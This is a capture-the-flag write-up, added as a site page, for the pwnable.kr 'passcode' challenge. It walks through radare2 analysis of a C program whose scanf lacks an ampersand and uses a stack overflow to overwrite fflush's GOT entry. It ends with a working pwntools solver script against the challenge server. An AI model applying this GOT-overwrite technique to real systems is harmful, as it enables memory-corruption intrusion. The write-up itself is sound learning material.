@@ -1,0 +1,405 @@
+---
+    "title": "pwnable.kr Writeup | passcode"
+    "difficulty": "Easy"
+    "isFeatured": "True"
+    "author": "Rvexrie"
+    "dateCreated": "17/7/2026"
+    "tags": ["Radare2", "GOT Overwrite", "Stack Buffer Overflow"]
+    "description": "Passcode is a beginner-level binary exploitation challenge that focuses on exploiting the C standard input function and manipulating dynamic tables in 32-bit ELF binary files."
+    "type": "PWN"
+    "link": "/writeup/passcode"
+    "platform": "pwnable.kr"
+---
+
+import Image from '../../components/element/Image.astro'
+import Section from '../../components/element/Section.astro';
+import Codeblock from '../../components/element/Codeblock.astro';
+import Paragraph from '../../components/element/Paragraph.astro'
+import ContentContainer from '../../components/element/Content.astro'
+
+<ContentContainer>
+<Section title="Challenge Description"/>
+<Paragraph>
+Mommy told me to make a passcode based login system.
+My first trial C implementation compiled without any error!
+Well, there were some compiler warnings, but who cares about that?
+</Paragraph>
+</ContentContainer>
+
+<ContentContainer>
+<Section title="Analysis"/>
+<Paragraph>I was given two files, elf and .c</Paragraph>
+<Paragraph>because we have the source code, let's check it first.</Paragraph>
+<Codeblock filename="passcode.c">
+``` c
+#include <stdio.h>
+#include <stdlib.h>
+
+void login(){
+	int passcode1;
+	int passcode2;
+
+	printf("enter passcode1 : ");
+	scanf("%d", passcode1);
+	fflush(stdin);
+
+	// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+	printf("enter passcode2 : ");
+        scanf("%d", passcode2);
+
+	printf("checking...\n");
+	if(passcode1==338150 && passcode2==13371337){
+                printf("Login OK!\n");
+		setregid(getegid(), getegid());
+                system("/bin/cat flag");
+        }
+        else{
+                printf("Login Failed!\n");
+		exit(0);
+        }
+}
+
+void welcome(){
+	char name[100];
+	printf("enter you name : ");
+	scanf("%100s", name);
+	printf("Welcome %s!\n", name);
+}
+
+int main(){
+	printf("Toddler's Secure Login System 1.1 beta.\n");
+
+	welcome();
+	login();
+
+	// something after login...
+	printf("Now I can safely trust you that you have credential :)\n");
+	return 0;	
+}
+```
+</Codeblock>
+<Paragraph>The pass is written hardcoded, i curious what will happen if i input them</Paragraph>
+<Codeblock filename="passcode">
+```
+◄ 0s ◎ ./passcode                                                                                                                                         □ pwnablekr/passcode ℂ v16.1.1-gcc py ⌉⌊ 3.14.6 00:54
+Toddler's Secure Login System 1.1 beta.
+enter you name : a
+Welcome a!
+enter passcode1 : 338150
+enter passcode2 : 13371337
+fish: Job 1, './passcode' terminated by signal SIGSEGV (Address boundary error)
+```
+</Codeblock>
+<Paragraph>of course its not that easy... but the error message quite useful, it return SIGSEGV, mean I corrupt the memory address somehow, so let's crosscheck the login section in .c</Paragraph>
+<Codeblock filename="passcode.c">
+```
+printf("enter passcode1 : ");
+scanf("%d", passcode1);
+fflush(stdin);
+
+// ha! mommy told me that 32bit is vulnerable to bruteforcing :)
+printf("enter passcode2 : ");
+    scanf("%d", passcode2);
+```
+</Codeblock>
+<Paragraph>just realize the `&` is missing in second argument, fyi if you write `scanf(%d, var)` the program will consider the value inside `var` is an address, then computer gonna write the input from user to that random memory address inside the `var` variable</Paragraph>
+<Paragraph>so... i think i may can overwrite spesific address in this chall, need to analyze the binary itself for that.</Paragraph>
+<Codeblock filename="radare2">
+```text {43,45}
+◄ 0s ◎ r2 -AA -d passcode                                                                                                             □ pwnablekr/passcode ℂ v16.1.1-gcc py ⌉⌊ 3.14.6 01:13
+INFO: glibc.fc_offset = 0x00148
+INFO: Analyze all flags starting with sym. and entry0 (aa)
+INFO: Analyze imports (af@@@i)
+INFO: Analyze entrypoint (af@ entry0)
+INFO: Analyze symbols (af@@@s)
+INFO: Running plugin pre-analysis hooks
+WARN: Variable 'anal.plugins.pre' not found
+INFO: Analyze all functions arguments/locals (afva@@F)
+INFO: Analyze function calls (aac)
+INFO: Analyze len bytes of instructions for references (aar)
+INFO: Finding and parsing C++ vtables (avrr)
+INFO: Analyzing methods (af @@ method.*)
+INFO: Recovering local variables (afva@@@F)
+INFO: Skipping type matching analysis in debugger mode (aaft)
+INFO: Propagate noreturn information (aanr)
+INFO: Scanning for strings constructed in code (/azs)
+INFO: Finding function preludes (aap)
+INFO: Enable types.constraint for experimental type propagation
+INFO: Running plugin post-analysis hooks
+ -- I love the smell of bugs in the morning.
+[0xf7f7c6e0]> iI
+arch     x86
+baddr    0x8048000
+binsz    14072
+bintype  elf
+bits     32
+canary   true
+injprot  false
+class    ELF32
+compiler GCC: (Ubuntu 11.4.0-1ubuntu1~22.04) 11.4.0
+crypto   false
+endian   little
+havecode true
+intrp    /lib/ld-linux.so.2
+laddr    0x0
+lang     c
+linenum  false
+lsyms    true
+machine  Intel 80386
+nx       true
+os       linux
+pic      false 
+relocs   true
+relro    partial 
+rpath    NONE
+sanitize false
+static   false
+stripped false
+uncaps   true
+subsys   linux
+va       true
+[0xf7f7c6e0]> 
+```
+</Codeblock>
+<Paragraph>yeah, pie is disabled and partial relro, should be possible to overwrite the memory address if there's a flaw other than missing ampersand</Paragraph>
+<Paragraph>as always, I'll check for overflow first</Paragraph>
+<Codeblock filename="radare2.txt">
+```text
+[0xf7fdc6e0]> ragg2 -P 200 -r 
+AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABB[0xf7fdc6e0]> dc
+Toddler's Secure Login System 1.1 beta.
+enter you name : AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAhAAiAAjAAkAAlAAmAAnAAoAApAAqAArAAsAAtAAuAAvAAwAAxAAyAAzAA1AA2AA3AA4AA5AA6AA7AA8AA9AA0ABB
+Welcome AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh!
+enter passcode1 : enter passcode2 : checking...
+Login Failed!
+(118133) Process exited with status=0x0
+[0xf7fba22c]> dr
+eax = 0xffffffda
+ebx = 0x00000000
+ecx = 0xffffffd0
+edx = 0x00000000
+esi = 0xf7f5a420
+edi = 0xf7f5b3a8
+esp = 0xff9a6198
+ebp = 0xf7f5b3c0
+eip = 0xf7fba22c
+eflags = 0x00000282
+oeax = 0x000000fc
+[0xf7fba22c]> 
+```
+</Codeblock>
+<Paragraph>hmm.. nothing interesting, let's analyze further, I'll decompile this.</Paragraph>
+<Codeblock filename="radare2.txt">
+```c {17, 42}
+[0xf7fba22c]> pdga @sym.welcome
+    0x080492f2 push ebp                         |
+    0x080492f2 push ebp                         |//WARNING: Variable defined which should be unmapped: var_4h
+                                                |
+    0x080492f2 push ebp                         |void sym.welcome(void)
+                                                |
+                                                |{
+                                                |    int unaff_EBX;
+                                                |    int in_GS_OFFSET;
+                                                |    int32_t var_70h;
+                                                |    int32_t var_ch;
+                                                |    int32_t var_4h;
+                                                |    
+    0x080492f9 call sym.__x86.get_pc_thunk.    |    sym.__x86.get_pc_thunk.bx();
+    0x08049304 mov eax, dword gs:[0x14]         |    var_ch = *(in_GS_OFFSET + 0x14);
+    0x08049319 call sym.imp.printf              |    sym.imp.printf(unaff_EBX + 0xd65);
+    0x0804932f call sym.imp.__isoc99_scanf      |    sym.imp.__isoc99_scanf(unaff_EBX + 0xd77,&var_70h);
+    0x08049345 call sym.imp.printf              |    sym.imp.printf(unaff_EBX + 0xd7d);
+    0x08049358 je 0x804935f                     |    if (var_ch != *(in_GS_OFFSET + 0x14)) {
+    0x0804935a call sym.__stack_chk_fail_lo    |    //WARNING: Subroutine does not return
+    0x0804935a call sym.__stack_chk_fail_lo    |        sym.__stack_chk_fail_local();
+                                                |    }
+    0x08049363 ret                              |    return;
+                                                |}
+                                                |
+[0xf7fba22c]> pdga @sym.login
+    0x080491f6 push ebp                         |
+    0x080491f6 push ebp                         |//WARNING: Variable defined which should be unmapped: var_8h
+                                                |
+    0x080491f6 push ebp                         |void sym.login(void)
+                                                |
+                                                |{
+                                                |    uint uVar1;
+                                                |    uint uVar2;
+                                                |    int unaff_EBX;
+                                                |    int32_t var_10h;
+                                                |    int32_t var_ch;
+                                                |    int32_t var_8h;
+                                                |    
+    0x080491fe call sym.__x86.get_pc_thunk.    |    sym.__x86.get_pc_thunk.bx();
+    0x08049213 call sym.imp.printf              |    sym.imp.printf(unaff_EBX + 0xe05);
+    0x08049228 call sym.imp.__isoc99_scanf      |    sym.imp.__isoc99_scanf(unaff_EBX + 0xe18,var_10h);
+    0x08049236 mov eax, dword [eax]             |    sym.imp.fflush(**(unaff_EBX + 0x2df9));
+    0x0804924e call sym.imp.printf              |    sym.imp.printf(unaff_EBX + 0xe1b);
+    0x08049263 call sym.imp.__isoc99_scanf      |    sym.imp.__isoc99_scanf(unaff_EBX + 0xe18,var_ch);
+    0x08049275 call sym.imp.puts                |    sym.imp.puts(unaff_EBX + 0xe2e);
+    0x0804928d jne 0x80492ce                    |    if ((var_10h == 0x528e6) && (var_ch == 0xcc07c9)) {
+    0x08049299 call sym.imp.puts                |        sym.imp.puts(unaff_EBX + 0xe3a);
+    0x080492a1 call sym.imp.getegid             |        uVar1 = sym.imp.getegid();
+    0x080492a8 call sym.imp.getegid             |        uVar2 = sym.imp.getegid();
+    0x080492b2 call sym.imp.setregid            |        sym.imp.setregid(uVar2,uVar1);
+    0x080492c4 call sym.imp.system              |        sym.imp.system(unaff_EBX + 0xe44);
+    0x080492f1 ret                              |        return;
+                                                |    }
+    0x080492d8 call sym.imp.puts                |    sym.imp.puts(unaff_EBX + 0xe52);
+    0x080492e5 call sym.imp.exit                |    //WARNING: Subroutine does not return
+    0x080492e5 call sym.imp.exit                |    sym.imp.exit(0);
+                                                |}
+                                                |
+```
+</Codeblock>
+<Paragraph>interesting.. fyi, because the second scanf missing ampersand, the variable in second argument has the same base stack with the previous scanf, mean If I have a sufficiently long input, i can overflow it and overwrite the variable, which is memory address!</Paragraph>
+<br/>
+<Paragraph>look at the highlighted code, you can see the name variable is -0x70 from rbp and passcode1 -0x10 from rbp, to calculate how much byte needed to reach passcode 1, you can substract 0x70 with 0x10, so we need 96 byte to reach passcode1 from name variable</Paragraph>
+<br/>
+<Paragraph>we know from the source code that i can input 100 byte, so reach passcode1 is possible, but what if we don't have the source code? how can we know exactly how much input is allocated for scanf?</Paragraph>
+<br/>
+<Paragraph>first you need to put break point on the address where scanf is called and run the program until it reach the break point, so the length will stored in `unaff_EBX + 0xd77`, then to know what inside `unaff_EBX + 0xd77` radare2 already has a build-in command for that</Paragraph>
+<br/>
+<Paragraph>`? unaff_EBX + 0xd77` to see the exact hex address</Paragraph>
+<Paragraph>`ps @hexAddress` to know what inside the address in string format</Paragraph>
+<Codeblock filename="radare2.txt">
+```text {4,16}
+[0x08049319]> ? ebx - 0x1f8b
+int32   134520949
+uint32  134520949
+hex     0x804a075
+octal   01001120165
+unit    128.3M
+segment 804000:a075
+string  "u\xa0\x04\b"
+fvalue  134520949.0
+float   0.000000000000000f
+double  0.000000000000000
+binary  0b00001000000001001010000001110101
+base36  0_283911
+ternary 0t100101010101001101
+[0x08049319]> ps @0x804a075
+%100s
+```
+</Codeblock>
+<Paragraph>So because now we know how much the length is, let's continue to check if we can really overflow the var_10h in login function</Paragraph>
+<Codeblock filename="overflow.txt">
+```text {5-8}
+[0x08049319]> dc
+enter you name : AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh 
+Welcome AAABAACAADAAEAAFAAGAAHAAIAAJAAKAALAAMAANAAOAAPAAQAARAASAATAAUAAVAAWAAXAAYAAZAAaAAbAAcAAdAAeAAfAAgAAh!
+"breakon vuln scanf"
+[0x08049228]> pxw 16 @ebp-0x10
+0xffd1a498  0x68414167 0xe4433a00 0x0804c000 0xf7f22e2c  gAAh.:C.....,...
+[0x08049228]> ragg2 -q 0x68414167
+Little endian: 96
+Big endian: -1
+[0x08049228]> 
+```
+</Codeblock>
+<Paragraph>from the highlighted line, its verify we can reach var_10h</Paragraph>
+<Paragraph>remember how scanf work if the second argument missing ampersand? we'll exploit that to reach the system call and get the flag, but how can we exploit that?</Paragraph>
+</ContentContainer>
+<ContentContainer>
+<Section title="Exploiting the vulnerable scanf"/>
+<Paragraph>if scanf missing ampersand, the scanf will consider value inside the variable as memory address where it will store the given input.</Paragraph> 
+<Paragraph>so if `passcode1` has the address where program will use to jump, then input the jump address with the system call address, we can get the flag!</Paragraph>
+<Paragraph>let's see what section in this binary where we have write permission</Paragraph>
+<Codeblock filename="permissions.txt">
+```text {22-28}
+[0x08049228]> iS
+nth paddr        size vaddr       vsize perm flags type        name
+―――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――――
+0   0x00000000    0x0 0x00000000    0x0 ---- 0x0   NULL
+1   0x00000194   0x13 0x08048194   0x13 -r-- 0x2   PROGBITS    .interp
+2   0x000001a8   0x24 0x080481a8   0x24 -r-- 0x2   NOTE        .note.gnu.build-id
+3   0x000001cc   0x20 0x080481cc   0x20 -r-- 0x2   NOTE        .note.ABI-tag
+4   0x000001ec   0x24 0x080481ec   0x24 -r-- 0x2   GNU_HASH    .gnu.hash
+5   0x00000210   0xf0 0x08048210   0xf0 -r-- 0x2   DYNSYM      .dynsym
+6   0x00000300   0xc0 0x08048300   0xc0 -r-- 0x2   STRTAB      .dynstr
+7   0x000003c0   0x1e 0x080483c0   0x1e -r-- 0x2   GNU_VERSYM  .gnu.version
+8   0x000003e0   0x50 0x080483e0   0x50 -r-- 0x2   GNU_VERNEED .gnu.version_r
+9   0x00000430   0x10 0x08048430   0x10 -r-- 0x2   REL         .rel.dyn
+10  0x00000440   0x50 0x08048440   0x50 -r-- 0x42  REL         .rel.plt
+11  0x00001000   0x24 0x08049000   0x24 -r-x 0x6   PROGBITS    .init
+12  0x00001030   0xb0 0x08049030   0xb0 -r-x 0x6   PROGBITS    .plt
+13  0x000010e0  0x2f8 0x080490e0  0x2f8 -r-x 0x6   PROGBITS    .text
+14  0x000013d8   0x18 0x080493d8   0x18 -r-x 0x6   PROGBITS    .fini
+15  0x00002000   0xe7 0x0804a000   0xe7 -r-- 0x2   PROGBITS    .rodata
+16  0x000020e8   0x44 0x0804a0e8   0x44 -r-- 0x2   PROGBITS    .eh_frame_hdr
+17  0x0000212c  0x104 0x0804a12c  0x104 -r-- 0x2   PROGBITS    .eh_frame
+18  0x00002f08    0x4 0x0804bf08    0x4 -rw- 0x3   INIT_ARRAY  .init_array
+19  0x00002f0c    0x4 0x0804bf0c    0x4 -rw- 0x3   FINI_ARRAY  .fini_array
+20  0x00002f10   0xe8 0x0804bf10   0xe8 -rw- 0x3   DYNAMIC     .dynamic
+21  0x00002ff8    0x8 0x0804bff8    0x8 -rw- 0x3   PROGBITS    .got
+22  0x00003000   0x34 0x0804c000   0x34 -rw- 0x3   PROGBITS    .got.plt
+23  0x00003034    0x8 0x0804c034    0x8 -rw- 0x3   PROGBITS    .data
+24  0x0000303c    0x0 0x0804c03c    0x4 -rw- 0x3   NOBITS      .bss
+25  0x0000303c   0x2b 0x00000000   0x2b ---- 0x30  PROGBITS    .comment
+26  0x00003068  0x300 0x00000000  0x300 ---- 0x0   SYMTAB      .symtab
+27  0x00003368  0x28f 0x00000000  0x28f ---- 0x0   STRTAB      .strtab
+28  0x000035f7  0x101 0x00000000  0x101 ---- 0x0   STRTAB      .shstrtab
+```
+</Codeblock>
+<Paragraph>from the highlighted line, the best candidate for overwrite is `.got.plt`, why?</Paragraph>
+<br/>
+<Paragraph>`Global Offset Table` or known as `GOT` is a section where the absolute memory addresses of external symbols<i>(like imported functions)</i> are stored.</Paragraph>
+<br/>
+<Paragraph>here how it works. programmer import function from external source -> the program use .plt, dynamic addressing for the function used, often unwriteable -> .plt has .got where absolute address of imported function stored, program will jump to this address and run the function</Paragraph>
+<br/>
+<Paragraph>if we somehow can overwrite the `GOT address` inside `.plt` function, we can jump to the address we write, and from the code below, the nearest function will be called is `fflush()`, so our objective now is overwrite the got address of fflush inside the .plt section, usually located in the very first line of .plt</Paragraph>
+<Codeblock filename="loginFunction">
+```text {7}
+ 0x08049228 b    e8a3feffff     call sym.imp.__isoc99_scanf ; int scanf(const char *format, ...)
+│           0x0804922d      83c410         add esp, 0x10
+│           0x08049230      8b83fcffffff   mov eax, dword [ebx - 4]
+│           0x08049236      8b00           mov eax, dword [eax]
+│           0x08049238      83ec0c         sub esp, 0xc
+│           0x0804923b      50             push eax
+│           0x0804923c      e81ffeffff     call sym.imp.fflush         ; int fflush(FILE *stream)
+```
+</Codeblock>
+<Paragraph>next we need to know which address `fflush.plt` is, and extract the very first line of `fflush.plt` section to get the got address</Paragraph>
+<Codeblock filename="GOTAddress.txt">
+```text {6}
+[0x08049228]> ii | grep fflush
+3   0x08049060 GLOBAL FUNC       fflush
+[0x08049228]> pd 1 @0x08049060
+            ; CALL XREF from sym.login @ 0x804923c(x)
+┌ 6: int sym.imp.fflush (FILE *stream);
+└           0x08049060      ff2514c00408   jmp dword [__stack_chk_fail] ; 0x804c014
+```
+</Codeblock>
+<Paragraph>From the code above we successfully extract the got address of fflush(), `0x804c014`</Paragraph>
+<Paragraph>The last thing we need now is the address to jump</Paragraph>
+<Codeblock filename="loginFunction">
+```c {5}
+    0x0804924e call sym.imp.printf              |    sym.imp.printf(unaff_EBX + 0xe1b);
+    0x08049263 call sym.imp.__isoc99_scanf      |    sym.imp.__isoc99_scanf(unaff_EBX + 0xe18,var_ch);
+    0x08049275 call sym.imp.puts                |    sym.imp.puts(unaff_EBX + 0xe2e);
+    0x0804928d jne 0x80492ce                    |    if ((var_10h == 0x528e6) && (var_ch == 0xcc07c9)) {
+    0x08049299 call sym.imp.puts                |        sym.imp.puts(unaff_EBX + 0xe3a);
+    0x080492a1 call sym.imp.getegid             |        uVar1 = sym.imp.getegid();
+    0x080492a8 call sym.imp.getegid             |        uVar2 = sym.imp.getegid();
+    0x080492b2 call sym.imp.setregid            |        sym.imp.setregid(uVar2,uVar1);
+    0x080492c4 call sym.imp.system              |        sym.imp.system(unaff_EBX + 0xe44);
+    0x080492f1 ret                              |        return;
+                                                |    }
+```
+</Codeblock>
+<Paragraph>from code above the best address to jump is `0x08049299`, more spesifically `134517401` because the `scanf()` want the input in decimal, why not jump directly to the system call?, because `system()` not the only thing we need here, the flag need root permission to read, so we also need `setregid()` to get our shell root privilege.</Paragraph>
+<Codeblock filename="solver.py">
+```python
+from pwn import *
+sh = ssh("passcode", "pwnable.kr", 2222, "guest")
+io = sh.shell("./passcode")
+payload = b"a"*96
+payload += p32(0x0804c014)
+payload2 = b"134517401"
+io.sendline(payload)
+io.sendline(payload2)
+print(io.recvall(3))
+```
+</Codeblock>
+<Paragraph>the code above is the exploit used for getting the flag</Paragraph>
+</ContentContainer>
